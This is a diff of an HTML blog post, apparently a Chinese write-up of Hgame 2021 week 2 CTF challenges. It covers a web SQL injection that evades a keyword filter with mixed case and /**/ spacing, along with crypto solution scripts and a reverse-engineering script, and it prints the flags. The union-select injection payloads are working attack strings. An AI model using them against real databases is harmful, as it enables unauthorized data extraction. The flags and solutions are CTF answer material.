 <p>过滤了一些关键词，大小写混用来绕过，空格用 <code>/**/</code> 绕过。</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># GET https://200ok.liki.link/server.php</span>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># GET https://200ok.liki.link/server.php</span>
 <span class="token comment"># 查询当前数据库</span>
 <span class="token operator">-</span><span class="token number">1</span><span class="token string">'/**/uNion/**/SelecT/**/database()#
 week2sqli
@@ -1039,13 +1039,13 @@ ffffff14gggggg
 
 <span class="token comment"># 查询字段值</span>
 <span class="token operator">-</span><span class="token number">1</span>'<span class="token comment">/**/</span><span class="token keyword">uNion</span><span class="token comment">/**/</span><span class="token keyword">SelecT</span><span class="token comment">/**/</span>ffffff14gggggg<span class="token comment">/**/</span><span class="token keyword">frOm</span><span class="token comment">/**/</span>f1111111144444444444g<span class="token comment">#</span>
-hgame{Con9raTu1ati0n5<span class="token operator">+</span>yoU_FXXK<span class="token operator">~</span>Up<span class="token operator">-</span>tH3<span class="token punctuation">,</span><span class="token number">5</span>Q1<span class="token operator">!</span><span class="token operator">!=</span><span class="token punctuation">)</span>}</code></pre>
+hgame{Con9raTu1ati0n5<span class="token operator">+</span>yoU_FXXK<span class="token operator">~</span>Up<span class="token operator">-</span>tH3<span class="token punctuation">,</span><span class="token number">5</span>Q1<span class="token operator">!</span><span class="token operator">!=</span><span class="token punctuation">)</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 
 
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p><strong>task:</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util <span class="token keyword">import</span> number
 
 <span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAG
@@ -1061,7 +1061,7 @@ c <span class="token operator">=</span> a <span class="token operator">**</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"c = {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token comment"># a = 164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543</span>
 <span class="token comment"># p = 119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383</span>
-<span class="token comment"># c = 61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732</span></code></pre>
+<span class="token comment"># c = 61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
 <p>(a + b) % n ≡ (a % n + b % n) % n<br>(a - b) % n ≡ (a % n - b % n) % n<br>(a * b) % n ≡ (a % n * b % n) % n<br>(a ^ b) % n ≡ ((a % n) ^ b) % n //幂运算</p>
 <p>若 a ≡ b (mod n)，则</p>
@@ -1078,7 +1078,7 @@ c <span class="token operator">=</span> a <span class="token operator">**</span>
 <p>在这题里面，就可以化简一下。</p>
 <p>$$<br>c = a ^ p \cdot m \bmod p \\<br>\ = a \cdot m \bmod p \\<br>\Rightarrow<br>m = c \cdot a^{-1} \bmod p<br>$$</p>
 <p><strong>Exp:</strong></p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">import</span> gmpy2
 
 a <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>mpz<span class="token punctuation">(</span><span class="token number">164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543</span><span class="token punctuation">)</span>
@@ -1090,7 +1090,7 @@ m <span class="token operator">=</span> c <span class="token operator">*</span> 
 <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token comment"># 3741406882261031073760817995303276732942491822855369918885665586853805791130867897899676088764261025784189</span>
-<span class="token comment"># b'hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}'</span></code></pre>
+<span class="token comment"># b'hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
 <h3 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h3><blockquote>
@@ -1103,7 +1103,7 @@ m <span class="token operator">=</span> c <span class="token operator">*</span> 
 <p><strong>Extensive reading:</strong></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2446">CTF中常见的RSA相关问题总结</a></p>
 </blockquote>
-<h3 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more?"></a>gcd or more?</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
+<h3 id="gcd-or-more"><a href="#gcd-or-more" class="headerlink" title="gcd or more?"></a>gcd or more?</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> secret <span class="token keyword">import</span> FLAG
 
 p <span class="token operator">=</span> <span class="token number">85228565021128901853314934583129083441989045225022541298550570449389839609019</span>
@@ -1112,7 +1112,7 @@ n <span class="token operator">=</span> p <span class="token operator">*</span> 
 
 cipher <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>s2n<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span>
-<span class="token comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span></code></pre>
+<span class="token comment"># 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5113">Rabin加密算法和n次同余方程</a>、<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Rabin_cryptosystem">Rabin cryptosystem</a></p>
 <p>正好符合加密的逻辑</p>
 <blockquote>
@@ -1136,7 +1136,7 @@ cipher <span class="token operator">=</span> <span class="token builtin">pow</sp
 </blockquote>
 <p>注意到这里的 p, q % 4 == 3.</p>
 <p>Exp:</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> random <span class="token keyword">import</span> randint
 <span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime
 <span class="token keyword">from</span> libnum <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -1209,7 +1209,7 @@ cipher <span class="token operator">=</span> <span class="token builtin">pow</sp
 <span class="token comment"># possible m: b'hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}'</span>
 <span class="token comment"># possible m: b'z\x95\x82\x00R3\x1d\x11\xb3\x02Q\xb8\x1f\xcd\xe0\xd0\xbeC\xc31%\xa8]* \t\xdb\xf1v\x87O\xf9 \x15\xbc\xcc+\xe0\xebf\xc4\xd4k\nJ\xfbN\x03\\\xcc\x7f\x00\xa9\x90\xd8l\xef\x98\xce^\xd3\xbd72'</span>
 <span class="token comment"># possible m: b';\x0b\xe7ra \x82\x1fXQ/\xa1V.\xb9\x91\xc2\xd1{\x9d\xe4;n\x9f\xbb\xd7\xeb\x15\xa8\xc6b\x1e\xb0d\x04^\x000\x0f\xa8\x9a\xfe\xa4\x05|\x9d\xa4}s\x05z\x94\xe9\x80\xda=97R\x00?6A\xa3'</span>
-<span class="token comment"># possible m: b'\xb5\xa1ir\xb3S\x9f1\x0bS\x81Yu\xfc\x9ab\x81\x15&gt;\xcf\t\xe3\xcb\xc9\xdb\xe1\xc7\x07\x1fMI\xb0o\x0c[\xae\xf8\x98\x93\xcb\xfbT\xa5\xdah&amp;\x8dLc\xa0\x80j-\xd1?0\xca]\xee\xf7\xaa\x7f9X'</span></code></pre>
+<span class="token comment"># possible m: b'\xb5\xa1ir\xb3S\x9f1\x0bS\x81Yu\xfc\x9ab\x81\x15&gt;\xcf\t\xe3\xcb\xc9\xdb\xe1\xc7\x07\x1fMI\xb0o\x0c[\xae\xf8\x98\x93\xcb\xfbT\xa5\xdah&amp;\x8dLc\xa0\x80j-\xd1?0\xca]\xee\xf7\xaa\x7f9X'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><code>hgame{3xgCd~i5_re4l1y+e@sy^r1ght?}</code></p>
 <h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h3><blockquote>
 <p>你写了一个什么奇怪的debugger？这东西能用？看起来规则也不太一样？</p>
@@ -1226,7 +1226,7 @@ cipher <span class="token operator">=</span> <span class="token builtin">pow</sp
 <p>于是就好办了，直接提取一下，异或完事！</p>
 <p><em>（我是 fw，这个脚本我写了贼久，刚开始是爆破密码，跑着一直不对，后来发现了异或就行，再后来才发现其实是循环跳出条件我写错了</em></p>
 <p>（爆破解/异或解都行</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
 fake_debugger beta
 MiaoTony
 """</span>
@@ -1271,7 +1271,7 @@ s <span class="token operator">=</span> <span class="token string">"hgame{"</spa
         s <span class="token operator">+=</span> i
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>
     <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">:</span>
-        <span class="token keyword">break</span></code></pre>
+        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/2021/02/15/CTF_2021HgameWeek2/image-20210211013515839.png" alt="flag"></p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>第二周题目还好还好。</p>
 <p>AK 了 Misc，后面几天过年就没看了 233.</p>
@@ -1287,7 +1287,7 @@ s <span class="token operator">=</span> <span class="token string">"hgame{"</spa
 >
 > Tinmix和朋友一起去玩密室逃脱,但是由于突发情况,Tinmix被锁在了一间密室里,于是开始四处摸索,昏暗的灯光下,Tinmix发现密室有一块大圆盘,被人工分割成了7块小圆盘,但由于刚开始没注意,每个圆盘已经被旋转过了,但Tinmix记住了旋转的过程和结果
 
-<pre class="language-none"><code class="language-none">y_1&#x3D;x_1⊕n_1⊕(x_1⋙7)⊕(x_1⋘3) 
+<pre class="line-numbers language-none"><code class="language-none">y_1&#x3D;x_1⊕n_1⊕(x_1⋙7)⊕(x_1⋘3) 
 y_2&#x3D;x_2⊕n_2⊕(x_2⋙4)⊕(x_2⋘9) 
 y_3&#x3D;x_3⊕n_3⊕(x_3⋙2)⊕(x_3⋘5) 
 y_4&#x3D;x_4⊕n_4⊕(x_4⋙6)⊕(x_4⋘13) 
@@ -1301,7 +1301,7 @@ y_7&#x3D;x_7⊕n_7⊕(x_7⋙2)⊕(x_7⋘5)
 (y_4,n_4) &#x3D; (10529571502219113153,9110411034859362)
 (y_5,n_5) &#x3D; (8020289479524135048,4092084344173014)
 (y_6,n_6) &#x3D; (10914636017953100490,2242282628961085)
-(y_7,n_7) &#x3D; (4622436850708129231,10750832281632461)</code></pre>
+(y_7,n_7) &#x3D; (4622436850708129231,10750832281632461)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
 <p><strong>定义</strong></p>
 <p>⋙表示循环右移<br> ⋘表示循环左移<br> ⊕表示异或运算</p>
